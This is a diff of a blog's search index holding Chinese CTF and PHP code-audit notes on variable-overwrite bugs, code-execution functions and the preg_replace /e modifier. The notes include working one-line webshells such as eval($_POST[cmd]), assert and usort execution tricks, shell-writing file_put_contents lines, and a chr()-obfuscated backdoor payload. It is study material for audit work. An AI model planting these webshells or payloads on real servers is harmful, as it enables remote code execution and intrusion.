@@ -1,16 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[变量覆盖漏洞]]></title>
+    <url>%2F2018%2F07%2F10%2F%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[0x00前段时间做题遇到很多关于变量覆盖漏洞的问题，想好好整理一下，把之前做题和看文章中遇到过的好好研究一下，简单记录一下。变量覆盖漏洞就是用自定义的参数值替换原有的变量值导致漏洞的产生。导致这种漏洞的本质是函数使用不当。 0x01经常引起变量覆盖漏洞的原因(函数)有：开启了全局变量注册、$$使用不当、extract()函数使用不当、parse_str()函数使用不当、import_request_variables()函数使用不当. 0x02 全局变量覆盖全局变量覆盖的关键是register_globalsregister_globals的意思就是注册为全局变量。当register_globals=On，用户传递的值会被直接的注册为全局变量直接使用；register_globals==Off，需要到特定的数组里去得到它。也就是说为on的时候，变量可以从各个地方传来，当为off的时候，不会有问题。示例代码： 1234567&lt;?phpecho &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;;if ($auth)&#123;echo &quot;private!&quot;;&#125;?&gt; 当register_globals=On提交?auth=1时，$auth会被赋值为1。ps：如果已经对$auth变量赋了初始值，即使提交也不会覆盖。 0x03 \$\$导致的变量覆盖漏洞\$\$导致变量覆盖的问题在于foreach() foreach遍历数组中的值，然后将获取到的数组键名作为变量，数组中的键值作为变量的值，所以就产生了变量覆盖漏洞。示例代码： 123456789101112&lt;?php// ?name=test// output:string(4) “name” string(4) “test” string(4) “test” test$name=’thinking’;foreach ($_GET as $key =&gt; $value)$$key = $value;var_dump($key);var_dump($value);var_dump($$key);echo $name;?&gt; 例题（iscc2018）源码 代码的大体意思是包含flag.php 满足三个条件才可以得到flag .，两个foreach对$$key的处理是不一样的，满足条件会打印出flag。可以看到有两个foreach,中间代码会将$flag值覆盖掉我们的思路是把$flag的值赋值给$_200或$_403 然后利用die(200)或die(403)打印出来。payload: GET: ?_200=flag POST: flag=aaaaaaaaaaaaaaa 0x04 extract()函数导致的变量覆盖漏洞extract() 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。函数语法： extract(array,extract_rules,prefix) 例题：(bugku) 12345678910111213141516&lt;?php$flag=&apos;xxx&apos;;extract($_GET);if(isset($shiyan))&#123;$content=trim(file_get_contents($flag));if($shiyan==$content)&#123;echo&apos;flag&#123;xxx&#125;&apos;;&#125;else&#123;echo&apos;Oh.no&apos;;&#125;&#125;?&gt; 用extract($_GET) 接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。payload：?flag=&amp;shiyan=这里是把 flag和shiyan的值都覆盖为空，从而相等。 0X05 parse_str()函数导致的变量覆盖漏洞parse_str() 函数把查询字符串解析到变量中。 如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。语法：parse_str(string,array) 1234567891011121314151617&lt;?phperror_reporting(0);if (empty($_GET[&apos;id&apos;])) &#123; show_source(__FILE__); die();&#125; else &#123; include (‘flag.php’); $a = “www.OPENCTF.com”; $id = $_GET[&apos;id&apos;]; @parse_str($id); if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123; echo $flag; &#125; else &#123; exit(‘其实很简单其实并不难！’); &#125;&#125;?&gt; 分析代码：get提交id。利用parse_str()函数处理，然后if比较，\$a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)满足 则打印flag这里利用的是 php弱语言特性，需要一个MD5后以0e开头的才能够返回true。这样的值很多，提交：?id=a[0]=240610708与parse_str()类似的函数还有mb_parse_str() 0x06 import_request_variables()函数导致的变量覆盖漏洞import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中示例代码： 123456789&lt;?php$auth = &apos;0&apos;;import_request_variables(&apos;G&apos;);if($auth == 1)&#123;echo &quot;private!&quot;;&#125;else&#123;echo &quot;public!&quot;;&#125;?&gt; import_request_variables(‘G’)指定导入GET请求中的变量，从而导致变量覆盖。 查阅资料，也参考了很多大佬的文章，还要多多积累，CTF中积累小的代码审计，才能审计cms，还要不断地理解。]]></content>
+      <categories>
+        <category>CTF-web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>变量覆盖漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[代码审计--代码执行函数总结]]></title>
     <url>%2F2018%2F07%2F09%2F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93%2F</url>
     <content type="text"><![CDATA[PHP中存在很多执行代码的函数，最近也看了很多总结的文章，这类执行代码的函数常用于写一句话木马，可能导致代码执行漏洞，简单总结一下。 0x00常见函数eval() 、assert() 、preg_replace()、call_user_func()、call_user_func_array() 、uasort() 、usort()、array_map() 、array_reduce()、array_udiff()、create_function() 、 array_filter()、array_walk_recursive()、文件操作函数、动态执行函数。参考：https://www.cnblogs.com/xiaozi/p/7834367.html http://www.freebuf.com/column/148183.html 0x01 eval()eval() 函数把字符串按照 PHP 代码来计算,该php代码必须是合法的php代码，且必须以分号结尾。常用于一句话木马:1&lt;?php eval($_POST[cmd])?&gt; 这个就是我们常见的一句话木马，比较好理解。0x02 assert()函数在php语言中是用来判断一个表达式是否成立， 返回true or false，如果不为true则会返回一个警告。这个函数与eval() 函数一样，字符串被当作php代码执行 代码，1234&lt;?php//?cmd =phpinfo();@assert($_POST[&apos;cmd&apos;]);?&gt; 1234&lt;?php//?cmd=phpinfo()@assert($_REQUEST[cmd]);?&gt; 0x03 preg_replace()函数执行一个正则表达式的搜索和替换 语法：语法： 1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )` 函数搜索subbject中与pattern相匹配的部分用replacement替换，执行正则表达式的搜索和替换，但是如果存在危险的/e修饰符，使preg_replace()中的replacement() 参数当作php代码执行。前边有文章已经分析这个危险函数。&lt;传送门&gt; 0x04 call_user_func()/call_user_func_array()这两个函数都是用来调用回调函数的。语法： 1mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。语法： 1mixed call_user_func_array ( callable $callback , array $param_arr ) 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。call_user_func — 把第一个参数作为回调函数调用,其余参数是回调函数的参数。call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数。 1234&lt;?php//?cmd=phpinfo()@call_user_func(assert,$_GET[&apos;cmd&apos;]);?&gt; 123456&lt;?php//?cmd=phpinfo()$cmd=$_GET[&apos;cmd&apos;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);?&gt; 0x05 uasort()/usort()语法： 1bool usort ( array &amp;$array , callable $value_compare_func ) 本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。语法： 1bool uasort ( array &amp;$array , callable $value_compare_func ) 本函数对数组排序并保持索引和单元之间的关联。主要用于对那些单元顺序很重要的结合数组进行排序。比较函数是用户自定义的。usort() 通过用户自定义的比较函数对数组进行排序。uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。 12345php环境&gt;=5.6才能用&lt;?php usort(...$_GET);?&gt;利用方式：test.php?1[]=1-1&amp;1[]=eval($_POST[&apos;x&apos;])&amp;2=assert[POST]:x=phpinfo(); 12345php环境&gt;=&lt;5.6才能用&lt;?php usort($_GET,&apos;asse&apos;.&apos;rt&apos;);?&gt;利用方式：test.php?1=1+1&amp;2=eval($_POST[x])[POST]:x=phpinfo(); 0x06 array_map()语法： 1array array_map ( callable $callback , array $array1 [, array $... ] ) array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。 12345678&lt;?php//?func=system&amp;cmd=whoami$func=$_GET[&apos;func&apos;];$cmd=$_GET[&apos;cmd&apos;];$array[0]=$cmd;$new_array=array_map($func,$array);//print_r($new_array);?&gt; 0x07 array_reduce()语法： 1array_reduce(array,myfunction,initial) array_reduce() 函数向用户自定义函数发送数组中的值，并返回一个字符串。 1234&lt;?php$v=$_REQUEST[&apos;v&apos;];$arr=array(1);array_reduce($arr, $v, $_POST[&apos;pass&apos;]); 0x08 array_udiff()语法： 1array_udiff(array1,array2,array3...,myfunction) array_udiff() 函数用于比较两个（或更多个）数组的键值 ，并返回差集。 12345&lt;?php$v=$_REQUEST[&apos;v&apos;];$arr=array($_POST[&apos;pass&apos;]);$arr2=array(1);array_udiff($arr, $arr2, $v); 0x09 create_function()语法： 1string create_function ( string $args , string $code ) create_function主要用来创建匿名函数，其中内部使用了eval的操作导致存在安全问题。若没有对输入进行过滤，可以构造特殊字符串传递给create_function()导致执行任意命令。 12345&lt;?php//?cmd=phpinfo();$func=create_function(&apos;&apos;,$_REQUEST[&apos;cmd&apos;]);$func();?&gt; 0x10 array_filter()语法： 1array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) 依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。array_filter() 函数用回调函数过滤数组中的值。 1234567&lt;?php//?func=system&amp;cmd=whoami$cmd=$_GET[&apos;cmd&apos;];$array1=array($cmd);$func =$_GET[&apos;func&apos;];array_filter($array1,$func);?&gt; 0x11 array_walk_recursive()语法： 1array_walk_recursive(array,myfunction,parameter...) 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数 1234&lt;?php$e=$_REQUEST[&apos;e&apos;];$arr=array($_POST[&apos;pass&apos;] =&gt;&apos;|.*|e&apos;,);array_walk_recursive($arr, $e, &apos;&apos;); 0x12 文件操作函数利用文件操作，写入木马文件。 1234&lt;?php$test=&apos;&lt;?php eval($_POST[cmd]);?&gt;&apos;;file_put_contents(&apos;test1.php&apos;,$test);?&gt; 123&lt;?phpfputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt; 0x13 函数 动态执行PHP函数直接由字符串拼接。 1234&lt;?php//?a=assert&amp;b=phpinfo()$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);?&gt; 自己的思考还比较少，总结的都是大佬的思路，慢慢补充自己的想法，其次对于php代码审计还得继续好好学，大部分漏洞的根源都是在代码上的问题。]]></content>
       <categories>
-        <category>代码执行</category>
+        <category>代码审计</category>
       </categories>
       <tags>
-        <tag>代码审计</tag>
         <tag>CTF</tag>
         <tag>web</tag>
+        <tag>代码审计</tag>
         <tag>代码执行函数</tag>
       </tags>
   </entry>
@@ -36,23 +49,23 @@
         <category>漏洞实例</category>
       </categories>
       <tags>
+        <tag>危险函数</tag>
         <tag>代码审计</tag>
         <tag>CVE-2016-5734</tag>
-        <tag>危险函数</tag>
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[危险函数--preg_replace()]]></title>
+    <title><![CDATA[代码执行函数--preg_replace()]]></title>
     <url>%2F2018%2F07%2F06%2F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E--preg_replace()%2F</url>
     <content type="text"><![CDATA[晚自习在补警职的作业orz苦啊。。表哥在看书的时候遇到的一个小问题，和我分享了一下，想起以前也遇到过这个危险函数，没有总结。回到宿舍已经快熄灯了，等到查完寝，学习了一下，简要总结。网上文章也比较多，发现都是一样的。。。。。。。参考参考。 1、关于 preg_replace() 函数：preg_replace 函数执行一个正则表达式的搜索和替换语法： 1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。2、危险来源：/e 修正符用在函数 preg_replace() 时，会将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。要确保 replacement 构成一个合法的php代码，才会执行，否则会报错。导致代码执行漏洞的产生。。 3、分析利用：代码： 123&lt;?echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);?&gt; 如果提交：?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行，即把phpinfo()执行） 在后门中的利用：h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97). chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60). chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91). chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59))解码：?h= fputs(fopen(data/a.php,w),&lt;?php eval($_POST[cmd])?&gt;);执行后： 在/data/目录下生成一个一句话木马文件 a.php 另一个例子： 123456&lt;?function test($str)&#123;&#125;echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $_GET[&quot;h&quot;]);?&gt; 提交 ?h=[php]phpinfo()[/php] 正则匹配后， replacement 参数变为’test(“phpinfo”)’，此时phpinfo仅是被当做一个字符串参数了，不会执行。但是， 提交?h=[php]{${phpinfo()}}[/php]，phpinfo()就会被执行 因为 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。通过{${}}构造出了一个特殊的变量，&#39;test(&quot;{${phpinfo()}}&quot;)&#39;，达到让函数被执行的效果（${phpinfo()}会被解释执行 4、限制条件：第一个参数需要e标识符，有了它可以执行第二个参数的命令。第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令。如： 12echo preg_replace(&quot;/texst/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;); echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst texst&quot;);都不会执 行，不满足第二个条件。 5、漏洞防范：将&#39;test(&quot;/1&quot;)&#39; 修改为&quot;test(&#39;/1&#39;)&quot;,这样‘${phpinfo()}&#39;就会被当做一个普通的字符串处理(单引号中的变量不会被处理)。 ps:整理写完已经是第二天了，，，orz。 睡觉。。明天还得复习，come on 。。。。。。。。]]></content>
       <categories>
-        <category>CTF-web</category>
+        <category>代码审计</category>
       </categories>
       <tags>
-        <tag>危险函数</tag>
         <tag>CTF</tag>
         <tag>web</tag>
-        <tag>代码执行漏洞</tag>
+        <tag>代码审计</tag>
+        <tag>代码执行函数</tag>
       </tags>
   </entry>
   <entry>
@@ -63,10 +76,10 @@
         <category>CTF-web</category>
       </categories>
       <tags>
-        <tag>危险函数</tag>
         <tag>CTF</tag>
         <tag>web</tag>
         <tag>sql注入</tag>
+        <tag>危险函数</tag>
       </tags>
   </entry>
   <entry>
